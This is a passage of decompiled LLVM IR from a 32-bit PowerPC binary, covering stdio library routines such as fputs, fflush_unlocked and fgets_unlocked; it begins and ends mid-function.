  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000e548 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %v0_1000e548, i32* %r28.global-to-local, align 4
  %v1_1000e56c = add i32 %arg3, 52
  %v2_1000e56c = inttoptr i32 %v1_1000e56c to i32*
  %v3_1000e56c = load i32, i32* %v2_1000e56c, align 4
  %v2_1000e570 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000e570, i32* @r3, align 4
  %v3_1000e57c = icmp eq i32 %v3_1000e56c, 0
  store i1 %v3_1000e57c, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000e57c, label %dec_label_pc_1000e584, label %dec_label_pc_1000e590

dec_label_pc_1000e584:                            ; preds = %entry
  %v0_1000e584 = call i32 @__pthread_return_void()
  %v0_1000e58c = call i32 @__pthread_return_0()
  %v0_1000e590.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_1000e594.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000e598.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000e590

dec_label_pc_1000e590:                            ; preds = %entry, %dec_label_pc_1000e584
  %v0_1000e598 = phi i32 [ %v0_1000e548, %entry ], [ %v0_1000e598.pre, %dec_label_pc_1000e584 ]
  %v0_1000e594 = phi i32 [ %arg3, %entry ], [ %v0_1000e594.pre, %dec_label_pc_1000e584 ]
  %v0_1000e590 = phi i32 [ %arg2, %entry ], [ %v0_1000e590.pre, %dec_label_pc_1000e584 ]
  store i32 268494240, i32* @lr, align 4
  %v3_1000e59c = inttoptr i32 %v0_1000e598 to i8*
  %v4_1000e59c = call i32 @__GI_fgets_unlocked(i8* %v3_1000e59c, i32 %v0_1000e590, i32 %v0_1000e594)
  store i32 %v4_1000e59c, i32* @r31, align 4
  store i32 %v2_1000e570, i32* @r3, align 4
  %v0_1000e5ac = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000e5ac, label %dec_label_pc_1000e5b0, label %dec_label_pc_1000e5b4

dec_label_pc_1000e5b0:                            ; preds = %dec_label_pc_1000e590
  %v0_1000e5b0 = call i32 @__pthread_return_void()
  %v0_1000e5b8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e5b4

dec_label_pc_1000e5b4:                            ; preds = %dec_label_pc_1000e590, %dec_label_pc_1000e5b0
  %v0_1000e5b8 = phi i32 [ %v4_1000e59c, %dec_label_pc_1000e590 ], [ %v0_1000e5b8.pre, %dec_label_pc_1000e5b0 ]
  %v1_1000e5c8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000e548)
  %v9_1000e5c8 = extractvalue %0 %v1_1000e5c8, 7
  store i4 %v9_1000e5c8, i4* @cr4, align 1
  ret i32 %v0_1000e5b8

; uselistorder directives
  uselistorder i32 %v0_1000e548, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000e5b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e590, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r29.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000e5dc = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %v0_1000e5dc, i32* %r29.global-to-local, align 4
  %v2_1000e5fc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000e5fc, i32* @r3, align 4
  %v1_1000e600 = add i32 %arg2, 52
  %v2_1000e600 = inttoptr i32 %v1_1000e600 to i32*
  %v3_1000e600 = load i32, i32* %v2_1000e600, align 4
  %v3_1000e60c = icmp eq i32 %v3_1000e600, 0
  store i1 %v3_1000e60c, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000e60c, label %dec_label_pc_1000e614, label %dec_label_pc_1000e620

dec_label_pc_1000e614:                            ; preds = %entry
  %v0_1000e614 = call i32 @__pthread_return_void()
  %v0_1000e61c = call i32 @__pthread_return_0()
  %v0_1000e620.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000e624.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000e620

dec_label_pc_1000e620:                            ; preds = %entry, %dec_label_pc_1000e614
  %v0_1000e624 = phi i32 [ %v0_1000e5dc, %entry ], [ %v0_1000e624.pre, %dec_label_pc_1000e614 ]
  %v0_1000e620 = phi i32 [ %arg2, %entry ], [ %v0_1000e620.pre, %dec_label_pc_1000e614 ]
  store i32 268494380, i32* @lr, align 4
  %v2_1000e628 = call i32 @__GI_fputs_unlocked(i32 %v0_1000e624, i32 %v0_1000e620)
  store i32 %v2_1000e628, i32* %r31.global-to-local, align 4
  store i32 %v2_1000e5fc, i32* @r3, align 4
  %v0_1000e638 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000e638, label %dec_label_pc_1000e63c, label %dec_label_pc_1000e640

dec_label_pc_1000e63c:                            ; preds = %dec_label_pc_1000e620
  %v0_1000e63c = call i32 @__pthread_return_void()
  %v0_1000e644.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e640

dec_label_pc_1000e640:                            ; preds = %dec_label_pc_1000e620, %dec_label_pc_1000e63c
  %v0_1000e644 = phi i32 [ %v2_1000e628, %dec_label_pc_1000e620 ], [ %v0_1000e644.pre, %dec_label_pc_1000e63c ]
  %v1_1000e654 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000e5dc)
  %v9_1000e654 = extractvalue %0 %v1_1000e654, 7
  store i4 %v9_1000e654, i4* @cr4, align 1
  ret i32 %v0_1000e644

; uselistorder directives
  uselistorder i32 %v0_1000e5dc, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__GI_fputs_unlocked, { 1, 0 }
  uselistorder label %dec_label_pc_1000e640, { 1, 0 }
  uselistorder label %dec_label_pc_1000e620, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001104c.607 to i32), i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_10028478.608 to i32), i32* @r29, align 4
  %v2_1000e684 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000e684, i32* @r3, align 4
  %v0_1000e68c = call i32 @__pthread_return_void()
  %v0_1000e694 = call i32 @__pthread_return_0()
  %v3_1000e69c = load i32, i32* @global_var_10028808.609, align 4
  %v3_1000e6a0 = icmp eq i32 %v3_1000e69c, 1
  br i1 %v3_1000e6a0, label %dec_label_pc_1000e6a8, label %dec_label_pc_1000e750

dec_label_pc_1000e6a8:                            ; preds = %entry
  %v3_1000e6ac = load i32, i32* @global_var_1002880c.610, align 4
  %tmp7 = icmp slt i32 %v3_1000e6ac, 1
  br i1 %tmp7, label %dec_label_pc_1000e750, label %dec_label_pc_1000e6b8

dec_label_pc_1000e6b8:                            ; preds = %dec_label_pc_1000e6a8
  %v2_1000e6c4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000e6c4, i32* @r3, align 4
  store i32 0, i32* @r30, align 4
  %v0_1000e6d0 = call i32 @__pthread_return_void()
  %v0_1000e6d8 = call i32 @__pthread_return_0()
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_100287b8.615 to i32*), align 4
  store i32 %storemerge8, i32* @r29, align 4
  %v3_1000e73011 = icmp eq i32 %storemerge8, 0
  %v0_1000e73412 = load i32, i32* @r30, align 4
  br i1 %v3_1000e73011, label %dec_label_pc_1000e73c, label %dec_label_pc_1000e6e8

dec_label_pc_1000e6e8:                            ; preds = %dec_label_pc_1000e6b8, %dec_label_pc_1000e730.backedge
  %v0_1000e73417 = phi i32 [ %v0_1000e734, %dec_label_pc_1000e730.backedge ], [ %v0_1000e73412, %dec_label_pc_1000e6b8 ]
  %v3_1000e73418.in = phi i32 [ %v0_1000e734, %dec_label_pc_1000e730.backedge ], [ %v0_1000e73412, %dec_label_pc_1000e6b8 ]
  %storemerge16 = phi i32 [ %storemerge, %dec_label_pc_1000e730.backedge ], [ %storemerge8, %dec_label_pc_1000e6b8 ]
  %v1_1000e6e8 = inttoptr i32 %storemerge16 to i16*
  %v2_1000e6e8 = load i16, i16* %v1_1000e6e8, align 2
  %v1_1000e6ec = add i32 %storemerge16, 32
  %v2_1000e6ec = inttoptr i32 %v1_1000e6ec to i32*
  %v3_1000e6ec = load i32, i32* %v2_1000e6ec, align 4
  store i32 %v3_1000e6ec, i32* @r31, align 4
  %v1_1000e6f0 = and i16 %v2_1000e6e8, -32720
  %v3_1000e6f4 = icmp eq i16 %v1_1000e6f0, 48
  br i1 %v3_1000e6f4, label %dec_label_pc_1000e704, label %dec_label_pc_1000e6fc

dec_label_pc_1000e6fc:                            ; preds = %dec_label_pc_1000e6e8
  store i32 %storemerge16, i32* @r30, align 4
  br label %dec_label_pc_1000e730.backedge

dec_label_pc_1000e704:                            ; preds = %dec_label_pc_1000e6e8
  %v3_1000e73418 = icmp eq i32 %v3_1000e73418.in, 0
  br i1 %v3_1000e73418, label %dec_label_pc_1000e708, label %dec_label_pc_1000e714

dec_label_pc_1000e708:                            ; preds = %dec_label_pc_1000e704
  store i32 %v3_1000e6ec, i32* bitcast (i32** @global_var_100287b8.615 to i32*), align 4
  br label %dec_label_pc_1000e718

dec_label_pc_1000e714:                            ; preds = %dec_label_pc_1000e704
  %v2_1000e714 = add i32 %v0_1000e73417, 32
  %v3_1000e714 = inttoptr i32 %v2_1000e714 to i32*
  store i32 %v3_1000e6ec, i32* %v3_1000e714, align 4
  %v0_1000e718.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000e718

dec_label_pc_1000e718:                            ; preds = %dec_label_pc_1000e708, %dec_label_pc_1000e714
  %v0_1000e718 = phi i32 [ %storemerge16, %dec_label_pc_1000e708 ], [ %v0_1000e718.pre, %dec_label_pc_1000e714 ]
  %v1_1000e718 = inttoptr i32 %v0_1000e718 to i16*
  %v2_1000e718 = load i16, i16* %v1_1000e718, align 2
  store i32 %v0_1000e718, i32* @r3, align 4
  %v1_1000e720 = and i16 %v2_1000e718, 8192
  %v3_1000e720 = icmp eq i16 %v1_1000e720, 0
  br i1 %v3_1000e720, label %dec_label_pc_1000e730.backedge, label %dec_label_pc_1000e728

dec_label_pc_1000e730.backedge:                   ; preds = %dec_label_pc_1000e718, %dec_label_pc_1000e6fc, %dec_label_pc_1000e728
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_1000e730 = icmp eq i32 %storemerge, 0
  %v0_1000e734 = load i32, i32* @r30, align 4
  br i1 %v3_1000e730, label %dec_label_pc_1000e73c, label %dec_label_pc_1000e6e8

dec_label_pc_1000e728:                            ; preds = %dec_label_pc_1000e718
  store i32 268494636, i32* @lr, align 4
  %v0_1000e728 = call i32 @free()
  br label %dec_label_pc_1000e730.backedge

dec_label_pc_1000e73c:                            ; preds = %dec_label_pc_1000e730.backedge, %dec_label_pc_1000e6b8
  store i32 %v2_1000e6c4, i32* @r3, align 4
  %v0_1000e744 = call i32 @__pthread_return_void()
  %v0_1000e74c = load i32, i32* @r29, align 4
  store i32 %v0_1000e74c, i32* @global_var_1002880c.610, align 4
  %v3_1000e758.pre = load i32, i32* @global_var_10028808.609, align 4
  br label %dec_label_pc_1000e750

dec_label_pc_1000e750:                            ; preds = %entry, %dec_label_pc_1000e6a8, %dec_label_pc_1000e73c
  %v3_1000e758 = phi i32 [ %v3_1000e69c, %entry ], [ 1, %dec_label_pc_1000e6a8 ], [ %v3_1000e758.pre, %dec_label_pc_1000e73c ]
  store i32 %v2_1000e684, i32* @r3, align 4
  %v1_1000e760 = add i32 %v3_1000e758, -1
  store i32 %v1_1000e760, i32* @global_var_10028808.609, align 4
  %v0_1000e768 = call i32 @__pthread_return_void()
  ret i32 %v0_1000e768

; uselistorder directives
  uselistorder i32 %v0_1000e734, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1000e718, { 1, 0 }
  uselistorder i32 %v3_1000e6ec, { 1, 0, 2 }
  uselistorder i32 %storemerge16, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e750, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e730.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e718, { 1, 0 }
  uselistorder label %dec_label_pc_1000e6e8, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_100287b8.615 to i32), i32* %r9.global-to-local, align 4
  %v5_1000e790 = icmp eq i16* %arg1, bitcast (i32** @global_var_100287b8.615 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_1000e790, label %dec_label_pc_1000e7b4, label %dec_label_pc_1000e7a8

dec_label_pc_1000e7a8:                            ; preds = %entry
  %v4_1000e7a8 = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_1000e7a8, label %dec_label_pc_1000e7b4, label %dec_label_pc_1000e8e0

dec_label_pc_1000e7b4:                            ; preds = %dec_label_pc_1000e7a8, %entry
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001104c.607 to i32), i32* @r30, align 4
  %v2_1000e7c0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000e7c0, i32* @r3, align 4
  %v0_1000e7d4 = call i32 @__pthread_return_void()
  %v0_1000e7dc = call i32 @__pthread_return_0()
  %v3_1000e7e4 = load i32, i32* @global_var_10028808.609, align 4
  store i32 %v2_1000e7c0, i32* @r3, align 4
  %v1_1000e7f4 = add i32 %v3_1000e7e4, 1
  store i32 %v1_1000e7f4, i32* %r9.global-to-local, align 4
  store i32 %v1_1000e7f4, i32* @global_var_10028808.609, align 4
  %v0_1000e800 = call i32 @__pthread_return_void()
  store i32 %v2_1000e7c0, i32* @r3, align 4
  %v0_1000e810 = call i32 @__pthread_return_void()
  %v0_1000e818 = call i32 @__pthread_return_0()
  store i32 268632064, i32* %r9.global-to-local, align 4
  store i32 %v2_1000e7c0, i32* @r3, align 4
  %v3_1000e824 = load i32, i32* bitcast (i32** @global_var_100287b8.615 to i32*), align 4
  store i32 %v3_1000e824, i32* @r31, align 4
  store i32 0, i32* @r28, align 4
  %v0_1000e830 = call i32 @__pthread_return_void()
  %v0_1000e8d0.pr = load i32, i32* @r31, align 4
  %v3_1000e8d03 = icmp eq i32 %v0_1000e8d0.pr, 0
  br i1 %v3_1000e8d03, label %dec_label_pc_1000e8d8, label %dec_label_pc_1000e838

dec_label_pc_1000e838:                            ; preds = %dec_label_pc_1000e7b4, %dec_label_pc_1000e8cc
  %v0_1000e854 = phi i32 [ %v3_1000e8cc, %dec_label_pc_1000e8cc ], [ %v0_1000e8d0.pr, %dec_label_pc_1000e7b4 ]
  %v1_1000e838 = inttoptr i32 %v0_1000e854 to i16*
  %v2_1000e838 = load i16, i16* %v1_1000e838, align 2
  %v3_1000e838 = zext i16 %v2_1000e838 to i32
  %v1_1000e83c = and i32 %v3_1000e838, 64
  store i32 %v1_1000e83c, i32* %r9.global-to-local, align 4
  %v3_1000e83c = icmp eq i32 %v1_1000e83c, 0
  br i1 %v3_1000e83c, label %dec_label_pc_1000e8cc, label %dec_label_pc_1000e844

dec_label_pc_1000e844:                            ; preds = %dec_label_pc_1000e838
  store i32 268632064, i32* %r9.global-to-local, align 4
  %v3_1000e848 = load i32, i32* @global_var_100287bc.613, align 4
  %v3_1000e84c = icmp eq i32 %v3_1000e848, 2
  br i1 %v3_1000e84c, label %dec_label_pc_1000e870, label %dec_label_pc_1000e854

dec_label_pc_1000e854:                            ; preds = %dec_label_pc_1000e844
  store i32 %v2_1000e7c0, i32* @r3, align 4
  %v0_1000e864 = call i32 @__pthread_return_void()
  %v0_1000e86c = call i32 @__pthread_return_0()
  %v0_1000e870.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e870

dec_label_pc_1000e870:                            ; preds = %dec_label_pc_1000e844, %dec_label_pc_1000e854
  %v0_1000e884 = phi i32 [ %v0_1000e854, %dec_label_pc_1000e844 ], [ %v0_1000e870.pre, %dec_label_pc_1000e854 ]
  %v1_1000e870 = inttoptr i32 %v0_1000e884 to i16*
  %v2_1000e870 = load i16, i16* %v1_1000e870, align 2
  %v3_1000e870 = zext i16 %v2_1000e870 to i32
  %v0_1000e874 = load i32, i32* @r27, align 4
  %v2_1000e874 = or i32 %v0_1000e874, %v3_1000e870
  %v1_1000e878 = and i32 %v2_1000e874, 832
  %v1_1000e87c = xor i32 %v1_1000e878, 320
  store i32 %v1_1000e87c, i32* %r9.global-to-local, align 4
  %v3_1000e87c = icmp eq i32 %v1_1000e87c, 0
  br i1 %v3_1000e87c, label %dec_label_pc_1000e884, label %dec_label_pc_1000e8b0

dec_label_pc_1000e884:                            ; preds = %dec_label_pc_1000e870
  store i32 %v0_1000e884, i32* @r3, align 4
  store i32 268494988, i32* @lr, align 4
  %v0_1000e888 = call i32 @__stdio_wcommit()
  %v3_1000e88c = icmp eq i32 %v0_1000e888, 0
  br i1 %v3_1000e88c, label %dec_label_pc_1000e89c, label %dec_label_pc_1000e894

dec_label_pc_1000e894:                            ; preds = %dec_label_pc_1000e884
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1000e8b0

dec_label_pc_1000e89c:                            ; preds = %dec_label_pc_1000e884
  %v0_1000e89c = load i32, i32* @r31, align 4
  %v1_1000e89c = inttoptr i32 %v0_1000e89c to i16*
  %v2_1000e89c = load i16, i16* %v1_1000e89c, align 2
  %v3_1000e89c = zext i16 %v2_1000e89c to i32
  %v1_1000e8a0 = add i32 %v0_1000e89c, 8
  %v2_1000e8a0 = inttoptr i32 %v1_1000e8a0 to i32*
  %v3_1000e8a0 = load i32, i32* %v2_1000e8a0, align 4
  store i32 %v3_1000e8a0, i32* %r9.global-to-local, align 4
  %v1_1000e8a4 = call i32 @__asm_rlwinm(i32 %v3_1000e89c, i32 0, i32 26, i32 24)
  %v2_1000e8a4 = trunc i32 %v1_1000e8a4 to i16
  %v1_1000e8a8 = load i32, i32* @r31, align 4
  %v2_1000e8a8 = add i32 %v1_1000e8a8, 28
  %v3_1000e8a8 = inttoptr i32 %v2_1000e8a8 to i32*
  store i32 %v3_1000e8a0, i32* %v3_1000e8a8, align 4
  %v3_1000e8ac = load i32, i32* @r31, align 4
  %v4_1000e8ac = inttoptr i32 %v3_1000e8ac to i16*
  store i16 %v2_1000e8a4, i16* %v4_1000e8ac, align 2
  br label %dec_label_pc_1000e8b0

dec_label_pc_1000e8b0:                            ; preds = %dec_label_pc_1000e870, %dec_label_pc_1000e894, %dec_label_pc_1000e89c
  store i32 268632064, i32* %r9.global-to-local, align 4
  %v3_1000e8b4 = load i32, i32* @global_var_100287bc.613, align 4
  %v3_1000e8b8 = icmp eq i32 %v3_1000e8b4, 2
  br i1 %v3_1000e8b8, label %dec_label_pc_1000e8cc, label %dec_label_pc_1000e8c0

dec_label_pc_1000e8c0:                            ; preds = %dec_label_pc_1000e8b0
  store i32 %v2_1000e7c0, i32* @r3, align 4
  %v0_1000e8c8 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000e8cc

dec_label_pc_1000e8cc:                            ; preds = %dec_label_pc_1000e8b0, %dec_label_pc_1000e838, %dec_label_pc_1000e8c0
  %v0_1000e8cc = load i32, i32* @r31, align 4
  %v1_1000e8cc = add i32 %v0_1000e8cc, 32
  %v2_1000e8cc = inttoptr i32 %v1_1000e8cc to i32*
  %v3_1000e8cc = load i32, i32* %v2_1000e8cc, align 4
  store i32 %v3_1000e8cc, i32* @r31, align 4
  %v3_1000e8d0 = icmp eq i32 %v3_1000e8cc, 0
  br i1 %v3_1000e8d0, label %dec_label_pc_1000e8d8, label %dec_label_pc_1000e838

dec_label_pc_1000e8d8:                            ; preds = %dec_label_pc_1000e8cc, %dec_label_pc_1000e7b4
  store i32 ptrtoint (i32* @global_var_1000e8dc.638 to i32), i32* @lr, align 4
  %v0_1000e8d8 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_1000e918

dec_label_pc_1000e8e0:                            ; preds = %dec_label_pc_1000e7a8
  %v3_1000e8e0 = load i16, i16* %arg1, align 2
  %v4_1000e8e0 = zext i16 %v3_1000e8e0 to i32
  store i32 0, i32* @r28, align 4
  %v1_1000e8e8 = and i32 %v4_1000e8e0, 64
  store i32 %v1_1000e8e8, i32* %r9.global-to-local, align 4
  %v3_1000e8e8 = icmp eq i32 %v1_1000e8e8, 0
  br i1 %v3_1000e8e8, label %dec_label_pc_1000e918, label %dec_label_pc_1000e8f0

dec_label_pc_1000e8f0:                            ; preds = %dec_label_pc_1000e8e0
  store i32 268495092, i32* @lr, align 4
  %v0_1000e8f0 = call i32 @__stdio_wcommit()
  store i32 -1, i32* @r28, align 4
  %v3_1000e8f8 = icmp eq i32 %v0_1000e8f0, 0
  br i1 %v3_1000e8f8, label %dec_label_pc_1000e900, label %dec_label_pc_1000e918

dec_label_pc_1000e900:                            ; preds = %dec_label_pc_1000e8f0
  %v0_1000e900 = load i32, i32* @r29, align 4
  %v1_1000e900 = inttoptr i32 %v0_1000e900 to i16*
  %v2_1000e900 = load i16, i16* %v1_1000e900, align 2
  %v3_1000e900 = zext i16 %v2_1000e900 to i32
  store i32 0, i32* @r28, align 4
  %v1_1000e908 = add i32 %v0_1000e900, 8
  %v2_1000e908 = inttoptr i32 %v1_1000e908 to i32*
  %v3_1000e908 = load i32, i32* %v2_1000e908, align 4
  store i32 %v3_1000e908, i32* %r9.global-to-local, align 4
  %v1_1000e90c = call i32 @__asm_rlwinm(i32 %v3_1000e900, i32 0, i32 26, i32 24)
  %v2_1000e90c = trunc i32 %v1_1000e90c to i16
  %v3_1000e910 = load i32, i32* @r29, align 4
  %v4_1000e910 = inttoptr i32 %v3_1000e910 to i16*
  store i16 %v2_1000e90c, i16* %v4_1000e910, align 2
  %v0_1000e914 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e914 = load i32, i32* @r29, align 4
  %v2_1000e914 = add i32 %v1_1000e914, 28
  %v3_1000e914 = inttoptr i32 %v2_1000e914 to i32*
  store i32 %v0_1000e914, i32* %v3_1000e914, align 4
  br label %dec_label_pc_1000e918

dec_label_pc_1000e918:                            ; preds = %dec_label_pc_1000e8f0, %dec_label_pc_1000e8e0, %dec_label_pc_1000e8d8, %dec_label_pc_1000e900
  %v0_1000e91c = load i32, i32* @r28, align 4
  ret i32 %v0_1000e91c

; uselistorder directives
  uselistorder i32 %v3_1000e8cc, { 1, 2, 0 }
  uselistorder i32 %v1_1000e87c, { 1, 0 }
  uselistorder i32 %v2_1000e7c0, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32* bitcast (i32** @global_var_100287b8.615 to i32*), { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32* @global_var_10028808.609, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i16* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000e918, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000e8cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e8b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e870, { 1, 0 }
  uselistorder label %dec_label_pc_1000e838, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_1000e9d8, label %dec_label_pc_1000e950

dec_label_pc_1000e950:                            ; preds = %entry
  store i32 %tmp, i32* @r31, align 4
  %v2_1000e9b83 = add i32 %arg2, -1
  store i32 %v2_1000e9b83, i32* @r29, align 4
  %v4_1000e9c09 = icmp eq i32 %arg2, 1
  br i1 %v4_1000e9c09, label %dec_label_pc_1000e9c4, label %dec_label_pc_1000e958

dec_label_pc_1000e958:                            ; preds = %dec_label_pc_1000e950, %dec_label_pc_1000e9b8.backedge
  %v2_1000e974 = phi i32 [ %v2_1000e97412, %dec_label_pc_1000e9b8.backedge ], [ %tmp, %dec_label_pc_1000e950 ]
  %v0_1000e958 = phi i32 [ %v0_1000e9bc, %dec_label_pc_1000e9b8.backedge ], [ %arg3, %dec_label_pc_1000e950 ]
  %v1_1000e958 = add i32 %v0_1000e958, 16
  %v2_1000e958 = inttoptr i32 %v1_1000e958 to i32*
  %v3_1000e958 = load i32, i32* %v2_1000e958, align 4
  %v1_1000e95c = add i32 %v0_1000e958, 24
  %v2_1000e95c = inttoptr i32 %v1_1000e95c to i32*
  %v3_1000e95c = load i32, i32* %v2_1000e95c, align 4
  %v2_1000e960 = add i32 %v3_1000e958, 1
  store i32 %v2_1000e960, i32* %r11.global-to-local, align 4
  %v3_1000e964 = icmp ult i32 %v3_1000e958, %v3_1000e95c
  %v5_1000e964 = icmp eq i32 %v3_1000e958, %v3_1000e95c
  store i1 %v5_1000e964, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000e964, label %dec_label_pc_1000e96c, label %dec_label_pc_1000e988

dec_label_pc_1000e96c:                            ; preds = %dec_label_pc_1000e958
  %v4_1000e958 = inttoptr i32 %v3_1000e958 to i8*
  %v3_1000e96c = load i8, i8* %v4_1000e958, align 1
  %v3_1000e970 = icmp eq i8 %v3_1000e96c, 10
  store i1 %v3_1000e970, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e974 = inttoptr i32 %v2_1000e974 to i8*
  store i8 %v3_1000e96c, i8* %v3_1000e974, align 1
  %v0_1000e978 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e978 = load i32, i32* @r30, align 4
  %v2_1000e978 = add i32 %v1_1000e978, 16
  %v3_1000e978 = inttoptr i32 %v2_1000e978 to i32*
  store i32 %v0_1000e978, i32* %v3_1000e978, align 4
  %v0_1000e97c = load i32, i32* @r31, align 4
  %v1_1000e97c = add i32 %v0_1000e97c, 1
  store i32 %v1_1000e97c, i32* @r31, align 4
  %v0_1000e980 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e980, label %dec_label_pc_1000e9c4, label %dec_label_pc_1000e9b8.backedge

dec_label_pc_1000e988:                            ; preds = %dec_label_pc_1000e958
  %v1_1000e9bc10 = inttoptr i32 %v0_1000e958 to i16*
  store i32 268495244, i32* @lr, align 4
  %v5_1000e988 = call i32 @getc_unlocked(i16* %v1_1000e9bc10, i32 %v3_1000e958)
  %v6_1000e988 = trunc i32 %v5_1000e988 to i8
  %v4_1000e98c = icmp eq i8 %v6_1000e988, -1
  store i1 %v4_1000e98c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e994 = icmp eq i8 %v6_1000e988, 10
  store i1 %v3_1000e994, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_1000e98c, label %dec_label_pc_1000e99c, label %dec_label_pc_1000e9ac

dec_label_pc_1000e99c:                            ; preds = %dec_label_pc_1000e988
  %v0_1000e99c = load i32, i32* @r30, align 4
  %v1_1000e99c = inttoptr i32 %v0_1000e99c to i16*
  %v2_1000e99c = load i16, i16* %v1_1000e99c, align 2
  %v1_1000e9a0 = and i16 %v2_1000e99c, 8
  %v3_1000e9a0 = icmp eq i16 %v1_1000e9a0, 0
  br i1 %v3_1000e9a0, label %dec_label_pc_1000e99c.dec_label_pc_1000e9c4_crit_edge, label %dec_label_pc_1000e9d8

dec_label_pc_1000e99c.dec_label_pc_1000e9c4_crit_edge: ; preds = %dec_label_pc_1000e99c
  %v0_1000e9c4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e9c4

dec_label_pc_1000e9ac:                            ; preds = %dec_label_pc_1000e988
  %v3_1000e9ac = load i32, i32* @r31, align 4
  %v4_1000e9ac = inttoptr i32 %v3_1000e9ac to i8*
  store i8 %v6_1000e988, i8* %v4_1000e9ac, align 1
  %v0_1000e9b0 = load i32, i32* @r31, align 4
  %v1_1000e9b0 = add i32 %v0_1000e9b0, 1
  store i32 %v1_1000e9b0, i32* @r31, align 4
  %v0_1000e9b4 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1000e9b4, label %dec_label_pc_1000e9c4, label %dec_label_pc_1000e9b8.backedge

dec_label_pc_1000e9b8.backedge:                   ; preds = %dec_label_pc_1000e9ac, %dec_label_pc_1000e96c
  %v2_1000e97412 = phi i32 [ %v1_1000e9b0, %dec_label_pc_1000e9ac ], [ %v1_1000e97c, %dec_label_pc_1000e96c ]
  %v0_1000e9b8 = load i32, i32* @r29, align 4
  %v2_1000e9b8 = add i32 %v0_1000e9b8, -1
  store i32 %v2_1000e9b8, i32* @r29, align 4
  %v0_1000e9bc = load i32, i32* @r30, align 4
